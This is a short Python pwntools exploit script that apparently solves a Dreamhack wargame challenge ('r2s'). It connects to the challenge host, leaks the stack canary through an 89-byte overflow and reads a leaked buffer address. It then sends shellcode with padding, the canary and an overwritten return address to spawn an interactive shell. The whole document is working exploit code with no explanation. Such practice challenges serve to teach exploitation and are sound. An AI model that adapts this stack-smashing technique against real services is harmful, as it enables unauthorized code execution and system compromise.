from pwn import *

def slog(symbol, addr):
  return success(symbol + ": " + hex(addr))


#context.log_level = 'debug'
context.arch = "amd64"

p = remote("host3.dreamhack.games", 20813)
#p = process("./r2s")

shellcode = asm(shellcraft.sh())


# Get buf address
p.recvuntil("Address of the buf: ")
buf = int(p.recv(14), 16)


# Canary Leak
payload = b'A' * 89
p.sendafter("Input: ", payload)
p.recvuntil(payload)
canary = u64(b'\x00' + p.recv(7))

slog("buf", buf)
slog("canary", canary)


# BOF
payload = shellcode
payload += b'A' * (88 - len(shellcode))
payload += p64(canary)
payload += b"B" * 8
payload += p64(buf)

p.sendlineafter("Input: ", payload)

p.interactive()
